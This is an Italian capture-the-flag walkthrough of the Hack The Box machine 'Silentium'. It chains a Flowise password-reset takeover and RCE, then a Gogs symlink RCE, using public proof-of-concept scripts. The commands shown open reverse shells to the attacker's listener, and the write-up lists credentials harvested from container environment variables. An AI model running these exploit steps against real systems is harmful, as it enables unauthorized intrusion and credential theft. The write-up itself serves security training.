# Silentium

IP vittima: 10.129.24.54 
IP attaccante: 10.10.15.219
## Recon
### nmap
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.27.112 -oG porte`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 16:26 CEST
Initiating SYN Stealth Scan at 16:26
Scanning 10.129.27.112 [65535 ports]
Discovered open port 80/tcp on 10.129.27.112
Discovered open port 22/tcp on 10.129.27.112
Completed SYN Stealth Scan at 16:26, 10.56s elapsed (65535 total ports)
Nmap scan report for 10.129.27.112
Host is up, received user-set (0.029s latency).
Scanned at 2026-05-01 16:26:42 CEST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.62 seconds
           Raw packets sent: 65607 (2.887MB) | Rcvd: 65595 (2.624MB)
```
`sudo nmap -sC -sV -A -p22,80 10.129.27.112 -oN servizi`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 16:27 CEST
Nmap scan report for silentium.htb (10.129.27.112)
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   21.81 ms 10.10.14.1
2   21.94 ms silentium.htb (10.129.27.112)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```
#### Risultati Reconnaissance
| Porta | Servizio | Versione             |
| ----- | -------- | -------------------- |
| 22    | SSH      | OpenSSH 9.6p1 Ubuntu |
| 80    | HTTP     | nginx 1.24.0         |
Hostname: silentium.htb
#### Osservazioni
- TTL 63 → Linux confermato (2 hop dalla tua macchina)
- SSH con OpenSSH 9.6p1 è aggiornato, difficile attaccarlo direttamente senza credenziali
- Il vettore principale è quasi certamente il web (porta 80)
- Il titolo della pagina è "Silentium | Institutional Capital & Lending Solutions" → sito finanziario/istituzionale
## Sito html: http://silentium.htb
Sul sito troviamo tre nomi:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260501173536.png)
Dal codice html della pagina troviamo:
- **Asset statici:** `/assets/styles.css` e `/assets/app.js` — da esaminare, specialmente `app.js`
- **Nessun form** visibile, nessun login, nessun link a sottodomini
- **Team:** Marcus Thorne, **Ben** (solo nome!), Elena Rossi → possibili username
Il nome "Ben" incompleto è sospetto, potrebbe essere un hint
## gobuster
`gobuster dir -u http://silentium.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 --exclude-length 8753`
Escludiamo le risposte con lunghezza 8753 perchè il server risponde **200 per qualsiasi path** (soft 404), dobbiamo quindi filtrare per lunghezza.
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silentium.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          8753
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://silentium.htb/assets/]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
Viene trovata una directory **assets**. Con un'ulteriore ricerca con [[gobuster]]troviamo due file:
`gobuster dir -u http://silentium.htb/assets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x css,js,php,html,txt -t 50 --exclude-length 8753`
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silentium.htb/assets
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          8753
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,js,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/app.js               (Status: 200) [Size: 1304]
/styles.css           (Status: 200) [Size: 766]
```
I file **app.js** e **styles.css** potevano essere trovati anche dall'analisi del codice html della sito sulla porta 80 (http://silentium.htb). I due file comunque non portano a nulla.
## ffuf
Cerchiamo altri sottodomini con [[ffuf]]:
`ffuf -u http://10.129.27.112/ -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.27.112/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 62ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1000 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
Troviamo il sottodomino **staging**
## Sottodominio staging
Visitiamo http://staging.silentium.htb/signin
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260501172814.png)
Dall'analisi del codice html della pagina scopriamo che si tratta del servizio **Flowise**
🎯 **Flowise** è una piattaforma open source per costruire AI agents — e su un ambiente di staging può essere una miniera d'oro.

- Flowise ha avuto **CVE note** in passato, tra cui **authentication bypass** e **path traversal**
- Gli ambienti di staging spesso hanno **credenziali deboli o nessuna autenticazione**
- Può esporre **API keys, flussi interni, connessioni a DB**

Con `curl http://staging.silentium.htb/api/v1/version` otteniamo la versione:
`{"version":"3.0.5"}%`

La versione **3.0.5** di **Flowise** è vulnerabile agli exploit CVE-2025-58434 e CVE-2025-59528.
### CVE-2025-58434 — Unauthenticated Account Takeover
L'endpoint forgot-password restituisce un token valido per il ripristino della password nella risposta API senza richiedere autenticazione. Un utente malintenzionato a conoscenza di un indirizzo email valido può reimpostare la password di qualsiasi account senza alcuna interazione da parte dell'utente.

Per ottenere il token: 
- clicchiamo su **forgot password?** poi inseriamo la mail ben@silentium.htb (il nome ben lo avevamo trovato sulla homepage di silentium.htb quindi proviamo ad usare una probabile mail con quel nome).
- Apriamo i **DevTools** di Firefox (F12) e scegliamo **Network**.
- Clicchiamo su **Send Reset Password Instructions**.
- Possiamo trovare il token nella risposta dal server:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260501175859.png)
Per cambiare la password:
- dopo aver ottenuto il token cliccare su **Change your password here**
- Compilare il form inserendo la mail ben@silentium.htb, il token ottenuto nel campo reset token e la nuova password rispettando le caratteristiche che deve avere.
- Cliccare su **Update Password**
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260502104012.png)
Ora possiamo accedere al servizio con la mail ben@silentium.htb e la password scelta.
### CVE-2025-59528 — Authenticated Remote Code Execution
Nella versione 3.0.5, Flowise è vulnerabile all'esecuzione di codice da remoto. Il nodo CustomMCP consente agli utenti di inserire le impostazioni di configurazione per la connessione a un server MCP esterno. Questo nodo analizza la stringa mcpServerConfig fornita dall'utente per creare la configurazione del server MCP. Tuttavia, durante questo processo, esegue codice JavaScript senza alcuna verifica di sicurezza. Nello specifico, all'interno della funzione convertToValidJSONString, l'input dell'utente viene passato direttamente al costruttore Function(), che valuta ed esegue l'input come codice JavaScript. Poiché questo codice viene eseguito con privilegi di runtime completi di Node.js, può accedere a moduli pericolosi come child_process e fs. 

Per sfruttare questo exploit e ottenere una reverse shell possiamo usare questo POC:
https://github.com/TYehan/CVE-2025-58434-59528
passaggi:
- otteniamo una api key nella pagina del servizio a cui abbiamo avuto accesso con ben@silentium.htb e la password che abbiamo cambiato:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260502105702.png)
- ci mettiamo in ascolto sulla porta 4444 (`nc -lvnp 4444`)
- lanciamo il comando:
```
python3 flowise_chain.py -t http://staging.silentium.htb --api-key hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc --lhost 10.10.15.219 --lport 4444;
```

Otteniamo una reverse shell. 
Vediamo che siamo **root** ma non troviamo flag ne directory di altri utenti quindi probabilmente siamo in un container [[docker]](con `ls -l /.dockerenv` troviamo effettivamente il file dockerenv).
## Password di ben - userflag
Nelle variabili di ambiente del container (comando `env`) troviamo delle credenziali preziose:
- **`FLOWISE_USERNAME=ben`**
- **`FLOWISE_PASSWORD=F1l3_d0ck3r`**
- **`SMTP_PASSWORD=r04D!!_R4ge`**
Proviamo subito SSH sull'host con l'utente **ben** e le password trovate, riusciremo accedere con la password **`r04D!!_R4ge`**:
`ssh ben@silentium.htb` + password
Riusciamo ad entrare come utente **ben**, nella cartella **/home/ben** troviamo la user flag.
## Scalata dei privilegi
I classici controlli con `sudo -l`, `find / -perm -4000 2>/dev/null` non portano a nulla.
Con il comando `ss -tlnp` mostriamo **le porte TCP in ascolto** sul sistema, cioè i servizi che stanno aspettando connessioni in ingresso. Il comando è usato per capire, ad esempio, se un servizio come SSH, MySQL, Apache, Nginx, Redis, ecc. è attivo e su quale porta sta ascoltando.
Otteniamo:
```
State                Recv-Q               Send-Q                               Local Address:Port                                Peer Address:Port               Process               
LISTEN               0                    4096                                     127.0.0.1:8025                                     0.0.0.0:*                                        
LISTEN               0                    511                                        0.0.0.0:80                                       0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:42441                                    0.0.0.0:*                                        
LISTEN               0                    4096                                       0.0.0.0:22                                       0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:1025                                     0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:3000                                     0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:3001                                     0.0.0.0:*                                        
LISTEN               0                    4096                                    127.0.0.54:53                                       0.0.0.0:*                                        
LISTEN               0                    4096                                 127.0.0.53%lo:53                                       0.0.0.0:*                                        
LISTEN               0                    511                                           [::]:80                                          [::]:*                                        
LISTEN               0                    4096                                          [::]:22                                          [::]:*                                        
```
Non riusciamo a vedere i processi ma utilizzando [[curl]]possiamo vedere gli header e capire che processi stanno girando. Sulla porta 3001 troviamo il servizio **gogs**:
`curl -s http://localhost:3001 | head -20`
```
<!DOCTYPE html>
<html>
<head data-suburl="">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	
		<meta name="author" content="Gogs" />
		<meta name="description" content="Gogs is a painless self-hosted Git service" />
		<meta name="keywords" content="go, git, self-hosted, gogs">
	
	<meta name="referrer" content="no-referrer" />
	<meta name="_csrf" content="jZQQOoYIfKoQsnQ6gT-NvLEMvhk6MTc3NzcxNTA2ODY3MDI1MjYyNw" />
	<meta name="_suburl" content="" />

	
	
		<meta property="og:url" content="http://staging-v2-code.dev.silentium.htb:3001/" />
		<meta property="og:type" content="website" />
		<meta property="og:title" content="Gogs">
		<meta property="og:description" content="Gogs is a painless self-hosted Git service.">
```

Creiamo un **port forward** SSH dalla nostra macchina per accedere a Gogs dal browser:
`ssh -L 3001:localhost:3001 ben@silentium.htb` + password **`r04D!!_R4ge`** 
Poi possiamo accedere al servizio dal nostro browser con `http://localhost:3001/`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260502123934.png)
Gog è vulnerabile all'exploit CVE-2025-8110
### CVE-2025-8110 — RCE Exploit
Questa vulnerabilità consente l'esecuzione di codice remoto (RCE) sfruttando l'API PutContents, che non verifica se un percorso di file sia un collegamento simbolico. Sovrascrivendo il file interno .git/config tramite un collegamento simbolico, è possibile iniettare un comando ssh maligno per attivare una shell inversa.
Utilizziamo questo POC:
https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit

Passaggi:
- creiamo un nuovo utente e accediamo al servizio (utilizzato username **xerand**, password **xerand73**)
- accediamo a **Your settings** cliccando sul quadrato in alto a destra, poi **Applications** e **Generate New Token**
- Generiamo un nuovo token dandogli un nome
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260502125329.png)
Token generato **4f0b4004431137cef44450862ee81f9ff81f5323**
- Dopo aver scaricato l'exploit e installato le dipendenze mettiamoci in ascolto sulla porta 5555 con `nc -lvnp 5555`
- Lanciamo l'exploit con il seguente comando utilizzando username e password dell'account creato e il token generato:
`python3 exploit.py -u http://localhost:3001 -un xerand -pw xerand73 -t 4f0b4004431137cef44450862ee81f9ff81f5323 -lh 10.10.15.219 -lp 5555`
- Otteniamo la shell come root

Nella cartella **/root** troviamo la root flag.
